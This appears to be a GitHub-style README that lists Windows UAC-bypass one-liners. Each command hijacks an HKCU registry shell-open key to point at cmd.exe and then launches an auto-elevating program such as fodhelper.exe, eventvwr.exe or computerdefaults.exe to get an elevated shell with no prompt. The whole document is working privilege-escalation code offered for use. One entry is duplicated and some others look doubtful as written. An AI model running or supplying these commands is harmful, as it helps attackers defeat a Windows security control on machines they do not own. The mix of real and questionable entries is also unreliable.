# uac-bypass-oneliners

Techniques
<br>
Using eventvwr.exe: <br> <br>

```

reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd /c start cmd" /f && eventvwr.exe
```
<br>
Using fodhelper.exe: <br> <br>

```

reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe

```


Using computerdefaults.exe:<br> <br>

```

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```
Using sdclt.exe:<br> <br>

```

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /ve /t REG_SZ /d "cmd.exe" /f && start sdclt.exe
```
<br>
Using slui.exe:<br> <br>

```

reg add HKCU\Software\Classes\exefile\shell\open\command /ve /t REG_SZ /d "cmd.exe" /f && reg add HKCU\Software\Classes\exefile\shell\open\command /v DelegateExecute /f && start slui.exe
```

<br>
Using perfmon.exe: <br> <br>

```

reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd /c start cmd" /f && start perfmon.exe
```

Using taskmgr.exe: <br><br>


```
reg add HKCU\Software\Classes\taskmgr\shell\open\command /ve /t REG_SZ /d "cmd.exe" /f && start taskmgr.exe
```

Using ComputerDefaults.exe: <br><br>
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && start computerdefaults.exe
```

